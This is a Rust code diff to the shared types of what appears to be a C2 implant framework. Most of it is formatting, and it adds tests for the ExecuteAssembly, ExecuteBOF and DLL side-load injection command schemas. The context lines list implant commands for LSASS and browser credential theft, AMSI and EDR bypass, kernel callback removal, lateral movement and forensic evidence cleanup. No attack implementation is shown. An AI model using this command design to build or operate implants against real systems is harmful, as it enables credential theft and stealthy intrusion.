@@ -37,14 +37,14 @@ pub mod forward_secrecy;
 pub mod hkdf_info;
 /// Indicator-of-compromise detection and reporting.
 pub mod ioc;
+/// Malleable C2 profile types shared between agent and server.
+pub mod malleable_types;
 /// Transport-layer normalization (Base64, Mask XOR, Netbios encoding).
 pub mod normalized_transport;
 /// P2P mesh protocol message types and link management.
 pub mod p2p_proto;
 /// TLS transport configuration and certificate handling.
 pub mod tls_transport;
-/// Malleable C2 profile types shared between agent and server.
-pub mod malleable_types;
 
 pub use audit::{AuditEvent, Outcome};
 
@@ -320,12 +320,15 @@ fn deserialize_sig_64<'de, D: serde::Deserializer<'de>>(d: D) -> Result<[u8; 64]
         fn visit_bytes<E: serde::de::Error>(self, v: &[u8]) -> Result<Self::Value, E> {
             v.try_into().map_err(|_| E::invalid_length(v.len(), &self))
         }
-        fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut seq: A) -> Result<Self::Value, A::Error> {
+        fn visit_seq<A: serde::de::SeqAccess<'de>>(
+            self,
+            mut seq: A,
+        ) -> Result<Self::Value, A::Error> {
             let mut buf = [0u8; 64];
             for (i, slot) in buf.iter_mut().enumerate() {
-                *slot = seq.next_element()?.ok_or_else(|| {
-                    serde::de::Error::invalid_length(i, &self)
-                })?;
+                *slot = seq
+                    .next_element()?
+                    .ok_or_else(|| serde::de::Error::invalid_length(i, &self))?;
             }
             Ok(buf)
         }
@@ -560,7 +563,6 @@ pub enum Command {
     },
 
     // ── Token Manipulation (Windows only) ───────────────────────────────
-
     /// Create a new logon session with the provided credentials.
     /// Returns the new session's token handle information on success.
     MakeToken {
@@ -581,7 +583,6 @@ pub enum Command {
     GetSystem,
 
     // ── Lateral Movement (Windows only) ─────────────────────────────────
-
     /// Execute a command on a remote host via PsExec-style service creation.
     PsExec {
         target_host: String,
@@ -753,7 +754,6 @@ pub enum Command {
     },
 
     // ── Surveillance ────────────────────────────────────────────────────
-
     /// Capture a screenshot of the specified monitor (or primary if `None`).
     /// Returns base64-encoded PNG bytes in the task response.
     Screenshot {
@@ -793,7 +793,6 @@ pub enum Command {
     ClipboardGet,
 
     // ── Browser stored-data recovery (Windows) ─────────────────────────
-
     /// Recover stored credentials and/or cookies from installed browsers.
     /// Windows-only; handled by the `browser-data` feature.
     /// Returns a JSON-encoded `BrowserDataResult` in the response payload.
@@ -806,7 +805,6 @@ pub enum Command {
     },
 
     // ── LSASS credential harvesting (Windows only) ──────────────────────
-
     /// Harvest credentials from LSASS process memory via incremental reading
     /// and in-process parsing.  No dump file is created on disk.  Returns a
     /// JSON-encoded credential list containing MSV (NT hashes), WDigest
@@ -814,7 +812,6 @@ pub enum Command {
     HarvestLSASS,
 
     // ── LSA Whisperer — SSP interface credential extraction (Windows) ─
-
     /// Extract credentials by interacting with LSA authentication packages
     /// (SSPs) through their documented interfaces.  Operates entirely within
     /// the LSA process's own security context without reading LSASS memory.
@@ -835,7 +832,6 @@ pub enum Command {
     LSAWhispererStop,
 
     // ── NTDLL unhooking (Windows) ──────────────────────────────────────
-
     /// Re-fetch a clean copy of ntdll.dll from \KnownDlls (or disk fallback)
     /// and overlay the .text section onto the in-memory (potentially hooked)
     /// ntdll.  This is the fallback when Halo's Gate fails (all adjacent
@@ -843,7 +839,6 @@ pub enum Command {
     UnhookNtdll,
 
     // ── AMSI bypass mode selection (Windows) ───────────────────────────
-
     /// Switch the active AMSI bypass strategy at runtime.  The agent will
     /// disable any running bypass and activate the selected one.
     AmsiBypassMode {
@@ -851,7 +846,6 @@ pub enum Command {
     },
 
     // ── Evanesco continuous memory hiding (Windows) ────────────────────
-
     /// Return a JSON status snapshot of the Evanesco page-tracker subsystem:
     /// number of tracked pages, current counts by state (encrypted / decrypted),
     /// idle threshold, scan interval, and total encrypt/decrypt call counts.
@@ -865,7 +859,6 @@ pub enum Command {
     },
 
     // ── Kernel callback overwrite (BYOVD, Windows only) ───────────────
-
     /// Discover and report all registered EDR kernel callbacks: process
     /// creation, thread creation, image load, and object manager callbacks.
     /// Returns a JSON array of discovered callbacks with module, address,
@@ -889,7 +882,6 @@ pub enum Command {
     KernelCallbackRestore,
 
     // ── EDR bypass transformation engine ────────────────────────────────
-
     /// Scan the agent's own `.text` section for byte signatures known to be
     /// detected by EDR (YARA rules, entropy heuristics, known gadget chains
     /// like direct syscall stubs).  Returns a JSON array of `SignatureHit`
@@ -993,7 +985,6 @@ pub enum Command {
     },
 
     // ── Syscall emulation control (Windows only) ─────────────────────────
-
     /// Toggle user-mode NT kernel interface emulation at runtime.
     /// When enabled, the agent routes configured Nt* calls through
     /// kernel32/advapi32 equivalents instead of ntdll syscall stubs,
@@ -1005,16 +996,14 @@ pub enum Command {
         enabled: bool,
     },
 
-// ── CET / Shadow Stack bypass (Windows only) ─────────────────────────
-
+    // ── CET / Shadow Stack bypass (Windows only) ─────────────────────────
     /// Query the current CET (Control-flow Enforcement Technology) /
     /// shadow-stack status on the agent host.  Returns a JSON object
     /// describing whether CET is present, enabled, and which bypass
     /// strategy is active.
     CetStatus,
 
-// ── Token-only impersonation (Windows only) ──────────────────────────
-
+    // ── Token-only impersonation (Windows only) ──────────────────────────
     /// Create a named pipe and impersonate the security context of the
     /// first connecting client using token-only impersonation (avoids
     /// `ImpersonateNamedPipeClient` on the main thread).  The pipe is
@@ -1033,8 +1022,7 @@ pub enum Command {
     /// domain, and SID.  Returns a JSON array of token metadata.
     ListTokens,
 
-// ── Forensic cleanup — Prefetch evidence removal (Windows only) ──────
-
+    // ── Forensic cleanup — Prefetch evidence removal (Windows only) ──────
     /// Clean Windows Prefetch (.pf) evidence for the specified executable
     /// name.  If `exe_name` is empty, cleans all .pf files.  The cleanup
     /// method (delete, patch, disable-service) is determined by config.
@@ -1083,8 +1071,7 @@ pub enum Command {
     /// timestamps from the configured reference file.
     SyncTimestamps,
 
-// ── Sandbox scoring (all platforms) ──────────────────────────────────
-
+    // ── Sandbox scoring (all platforms) ──────────────────────────────────
     /// Run a comprehensive sandbox/VM detection sweep and return the full
     /// indicator breakdown (category, detail, weight, source) together
     /// with the total score and the threshold used.  This gives operators
@@ -1298,9 +1285,7 @@ mod virtual_lock {
 
     fn resolve_fn<T>(name: &[u8]) -> Option<T> {
         unsafe {
-            let module = pe_resolve::get_module_handle_by_hash(
-                pe_resolve::HASH_KERNEL32_DLL,
-            )?;
+            let module = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
             let name_hash = pe_resolve::hash_str(name);
             let proc = pe_resolve::get_proc_address_by_hash(module, name_hash)?;
             Some(std::mem::transmute_copy(&proc))
@@ -1337,7 +1322,9 @@ impl LockedSecret {
     /// Create a new `LockedSecret` from a byte slice, immediately locking it
     /// in physical RAM.
     pub fn new(data: &[u8]) -> Self {
-        let s = Self { data: data.to_vec() };
+        let s = Self {
+            data: data.to_vec(),
+        };
         s.lock_memory();
         s
     }
@@ -1623,7 +1610,10 @@ impl CryptoSession {
         key_bytes
     }
 
-    fn decrypt_nonce_prefixed(cipher: &Aes256Gcm, ciphertext: &[u8]) -> Result<Vec<u8>, CryptoError> {
+    fn decrypt_nonce_prefixed(
+        cipher: &Aes256Gcm,
+        ciphertext: &[u8],
+    ) -> Result<Vec<u8>, CryptoError> {
         if ciphertext.len() < NONCE_LEN {
             return Err(CryptoError::Truncated);
         }
@@ -1895,7 +1885,10 @@ mod tests {
         let a = CryptoSession::from_shared_secret(b"k").encrypt(b"same");
         let b = CryptoSession::from_shared_secret(b"k").encrypt(b"same");
         assert_ne!(a[..SALT_LEN], b[..SALT_LEN]);
-        assert_ne!(a[SALT_LEN..SALT_LEN + NONCE_LEN], b[SALT_LEN..SALT_LEN + NONCE_LEN]);
+        assert_ne!(
+            a[SALT_LEN..SALT_LEN + NONCE_LEN],
+            b[SALT_LEN..SALT_LEN + NONCE_LEN]
+        );
         assert_ne!(a, b);
     }
 
@@ -1943,5 +1936,69 @@ mod tests {
             }
             _ => panic!("unexpected variant"),
         }
+    }
+
+    #[test]
+    fn dashboard_execute_payload_json_matches_command_schema() {
+        let assembly: Command = serde_json::from_value(serde_json::json!({
+            "ExecuteAssembly": {
+                "data": [77, 90, 144, 0],
+                "args": ["--mode", "audit"],
+                "timeout_secs": 45
+            }
+        }))
+        .unwrap();
+        assert!(matches!(
+            assembly,
+            Command::ExecuteAssembly { data, args, timeout_secs }
+                if data == vec![0x4d, 0x5a, 0x90, 0x00]
+                    && args == vec!["--mode", "audit"]
+                    && timeout_secs == Some(45)
+        ));
+
+        let bof: Command = serde_json::from_value(serde_json::json!({
+            "ExecuteBOF": {
+                "data": [222, 173, 190, 239],
+                "args": ["arg1", "arg2"],
+                "timeout_secs": 60
+            }
+        }))
+        .unwrap();
+        assert!(matches!(
+            bof,
+            Command::ExecuteBOF { data, args, timeout_secs }
+                if data == vec![0xde, 0xad, 0xbe, 0xef]
+                    && args == vec!["arg1", "arg2"]
+                    && timeout_secs == Some(60)
+        ));
+    }
+
+    #[test]
+    fn dashboard_side_load_json_matches_export_config_schema() {
+        let command: Command = serde_json::from_value(serde_json::json!({
+            "InjectSideLoad": {
+                "pid": 4242,
+                "payload": [170, 187, 204, 221],
+                "export_config": {
+                    "forward_target": "version.dll",
+                    "named_exports": ["GetFileVersionInfoA", "VerQueryValueW"],
+                    "ordinal_exports": [[1, "DllRegisterServer"], [2, "DllUnregisterServer"]]
+                }
+            }
+        }))
+        .unwrap();
+
+        assert!(matches!(
+            command,
+            Command::InjectSideLoad { pid, payload, export_config }
+                if pid == 4242
+                    && payload == vec![0xaa, 0xbb, 0xcc, 0xdd]
+                    && export_config.forward_target == "version.dll"
+                    && export_config.named_exports == vec!["GetFileVersionInfoA", "VerQueryValueW"]
+                    && export_config.ordinal_exports == vec![
+                        (1, "DllRegisterServer".to_string()),
+                        (2, "DllUnregisterServer".to_string())
+                    ]
+        ));
     }
 }
